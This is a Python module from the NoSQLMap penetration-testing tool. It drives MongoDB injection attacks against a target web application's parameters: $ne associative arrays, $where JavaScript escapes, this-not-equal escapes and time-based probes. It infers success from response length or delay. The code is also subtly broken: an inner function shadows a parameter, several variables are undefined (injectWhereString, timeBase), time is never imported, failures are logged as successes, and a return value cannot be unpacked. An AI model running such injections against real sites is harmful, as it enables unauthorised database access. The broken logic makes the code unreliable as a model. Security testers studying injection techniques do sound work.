#!/usr/bin/python
# -*- coding: UTF-8 -*-

#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

from log import Logger
import injStrings
import copy

class InjectionManager:
    """
    This class provides injections tests.
    Whenever you want to add a new injection, just add it to AvailableTests and add the corresponding function.
    
    Creating a new injection require:
        - a verification function, returning a value -1,0,1 according to the result of the injection. The function takes as input the length of the response.
        - an InjString object, returning a string to be injected

    The injection should:
        - go over the vulnerable parameters
        - go over the injString object generator for creating strings to be injected
        - do any further modification to the injection string (like removeEquals)
        - (optional) call baselineTestEnterRandomString for getting a reference to the standard length of the page
        - call __performInjection in order to perform the actual injection
        - if result is positive, call __saveResult, __logResult and __addSuccessful to save the result of the injection, log the result and save the result



    Private methods are provided for support to injections.
    """

    AvailableTests={
            1: "mongoPHPNotEqualAssociativeArray",
            2: "mongoWhereInjection",
            3: "MongoThisNotEqualEscape", 
            4: "mongoTimeBasedInjection"
            }
    randInjDelta = 100

    def __init__(self, connection, standard_length,vulnParam=""):
        """
        Initialize the object.
        Needs an HTTPConnection object (see related method), a standard length for the page (will be used for checking if injection succeeded or not) 
        and an optional vulnParam, which will be the parameter to be injected during injection. If empty, every parameter will be checked.
        During the injection the following parameter will be created:
        a injStringCreator object, which will be used for generating strings to be injected.
        a possVuln and sureVuln list, where results from injections will be stored.
        a successfullAttacks dictionary, in the form of {attack: T/F}.
        """

        self.conn = connection
        self.dictOfParams = connection.payload
        if vulnParam:
            self.testingParams=[vulnParam]
        else:
            self.testingParams = connection.payload
        self.standardLength = standard_length
        self.injStringCreator=injStrings.InjectionStringCreator()
        self.possVuln=[]
        self.sureVuln=[]
        self.successfulAttacks = {} 

    def __addSuccessful(self, suc, funcName):
        """
        Add a successfull attack to the dictionary successfulAttacks.
        Take as input a boolean success T/F and an injection name, and set the entry in the dictionary accordingly
        """
        
        if suc:
            self.successfulAttacks[funcName]=True
        else:
            self.successfulAttacks[funcName]=False

    def __logResult(self, result):
        """
        Printing function according to the result (-1,0,1).
        """

        if result==-1:
            Logger.error("Injection Failed")
        if result==0:
            Logger.warning("Injection possibly Succeeded")
        else:
            Logger.success("Injection Succeeded")

    def __saveResult(self, result, connParams):
        """
        Take as input a result value (-1,0,1) and save in sureVuln or possVuln the connection parameters allowing the injection.
        Return True if attack possible/succeeded, False otherwise.
        """

        if result==-1:
            return False
        elif result==0:
            self.possVuln.append(connParams)
            return True
        else:
            self.sureVuln.append(connParams)
            return True


    def __performInjection(self, verificationFunction, injParam="", injectString="", removeEqual=False, dummyInjection=False):
        """
        Perform an injection.
        This is an abstract function, as it does not require any information about the kind of injection performed.
        take as input:
        @verificationFunction: the function needed for verifying if the injection succeeded or not.
        @injParam: the parameter to be injected among the ones in the dictOfParams belonging to the HTTPConnection object.
        @injectString: the injection string chosen (will be inserted as value of the parameter selected)
        @removeEqual: boolean, for letting the url be in the form name=value or name[sth]=value (where [sth]=value will be the injectString)
        @dummyInjection: boolean, used when the injection is not using any injection string

        Return the result from the verificationFunction (should be -1,0,1) and a list of elements "connParams" ready to be inserted in possibleVuln/sureVuln list
        """
        
        
        
        def removeEqual(tup, injParam):
            """
            Supporting function: as some injection requires the parameter not to appear in the standard form param=value but as para[sth]=value
            This method removes the equal from the injection.
            Take as input a list of parameters, and the parameter from which we want to remove the equal.
            Return the list of parameters where the equal is removed.
            """
            l=[]    
            for el in tup:
                ele = el
                pos=el.find(injParam)
                stLen=len(injParam)
                if pos != -1 and el[pos+stLen]=="=":
                    ele = el[:pos+stLen]+el[pos+stLen+1:]
                l.append(ele)
            return l
        tmpDic = copy.deepcopy(self.dictOfParams)
        if not dummyInjection:
            tmpDic[injParam]=injectString
        connParams = self.conn.buildUri(tmpDic)
        if removeEqual:
            connParams = removeEqual(connParams, injParam)
        code, length = self.conn.doConnection(connParams)
        if code != 200: #if no good answer pass to successive test
            return False
        m="Got response length of %s" %(length)
        Logger.info(m)
        result = verificationFunction(length)
        return result,connParams

    def baselineTestEnterRandomString(self, params, injectString):
        '''this function is needed by other functions in order to test things (ex for mongoPHP not equal)'''
        def checkLength(length):
            delta = length - self.standardLength
            self.injectStringLength = length
            if delta == 0:
                return -1
            else:
                return 1

        res, connParams = self.__performInjection(checkLength, params, injectString)
        return res,connParams

    def mongoPHPNotEqualAssociativeArray(self):
        """
        mongoPHPNotEqualAssociativeArray function.
        Test for param[$ne]=value.
        veryFunction is based on returned length of the page.
        """



        def verifyFunction(length):
            randInjDelta = abs(length - self.injectStringLength)
            if (randInjDelta >= 100) and (length != 0) :
                return 1

            elif (randInjDelta > 0) and (randInjDelta < 100) and (length != 0) :
                return 0
            elif (randInjDelta == 0):
                return -1    
            else:
                return 0
        funcName="mongoPHPNotEqualAssociativeArray"
        Logger.info("Testing Mongo PHP not equals associative array injection")
        cic = False
        for params in self.testingParams:
            for injectString in self.injStringCreator.createIdString():
                injectNeqString = self.injStringCreator.makeNeqString(injectString)
                m="using %s for injection testing" %(injectNeqString)
                Logger.info(m)
                origRes, origConnParams = self.baselineTestEnterRandomString(params, injectString)
                res,connParams=self.__performInjection(verifyFunction, params, injectNeqString, True)
                cic = cic or self.__saveResult(res, connParams)
                self.__logResult(res)
        self.successfulAttacks[funcName]= cic
    def mongoWhereInjection(self):

        def verifyFunction(length):
            randInjDelta = abs(length - self.injectStringLength)
            if (randInjDelta >= 100) and (length != 0) :
                return 1

            elif (randInjDelta > 0) and (randInjDelta < 100) and (length != 0) :
                return 0
            elif (randInjDelta == 0):
                return -1
            else:
                return 0
        funcName="mongoWhereInjection"
        Logger.info("Testing Mongo <2.4 $where all Javascript escape attack")
        cic = False
        for params in self.testingParams:
            for injectString in self.injStringCreator.createIdString():
                for injectWhereString in self.injStringCreator.makeWhereString(injectString):
                    m="using %s for injection testing" %(injectWhereString)
                    Logger.info(m)
                    origRes, origConnParams = self.baselineTestEnterRandomString(params, injectString)
                    res,connParams=self.__performInjection(verifyFunction, params, injectWhereString, False)
                    cic = cic or self.__saveResult(res, connParams)
                    self.__logResult(res)
        self.successfulAttacks[funcName]= cic

    def mongoThisNotEqualEscape(self):

        def verifyFunction(length):
            randInjDelta = abs(length - self.injectStringLength)
            if (randInjDelta >= 100) and (length != 0) :
                return 1

            elif (randInjDelta > 0) and (randInjDelta < 100) and (length != 0) :
                return 0
            elif (randInjDelta == 0):
                return -1
            else:
                return 0
        funcName="MongoThisNotEqualEscape"
        Logger.info("Testing Mongo this not equals escape attack")
        cic = False
        for params in self.testingParams:
            for injectString in self.injStringCreator.createIdString():
                for injectThisString in self.injStringCreator.makeBlindNeqString(injectString):
                    m="using %s for injection testing" %(injectWhereString)
                    Logger.info(m)
                    origRes, origConnParams = self.baselineTestEnterRandomString(params, injectString)
                    res,connParams=self.__performInjection(verifyFunction,params, injectThisString, False)
                    cic = cic or self.__saveResult(res, connParams)
                    self.__logResult(res)
        self.successfulAttacks[funcName]= cic


    def mongoTimeBasedInjection(self):
        #VERY NAIVE IMPLEMENTATION, IMPROVE WITH MORE TESTING
        def dummyF(l):
            return 0
        funcName="mongoTimeBasedInjection"
        Logger.info("Testing time based injection")
        start=time.time()
        res,connParams = self.__performInjection(dummyF, dummyInjection=True)
        end = time.time()
        for params in self.testingParams:
            for injectString in self.injStringCreator.createTimeString():
                startTest = time.time()
                res,connParams=self.__performInjection(dummyF, params, injectString)
                endTest = time.time()
        #TIME TESTING PERFORMED LOCALLY TODO: CREATE AN ABSTRACT FACTORY FOR TET WORKING 
                strTimeDelta = (int(round((end - start), 3)) - timeBase)
                if strTimeDelta > 25:
                    m="HTTP load time variance was %s seconds! Injection succeeded" %(strTimeDelta)
                    Logger.success(m)
                    suc=True
                    self.sureVuln.append(connParams)

        self.__addSuccessful(suc,funcName)
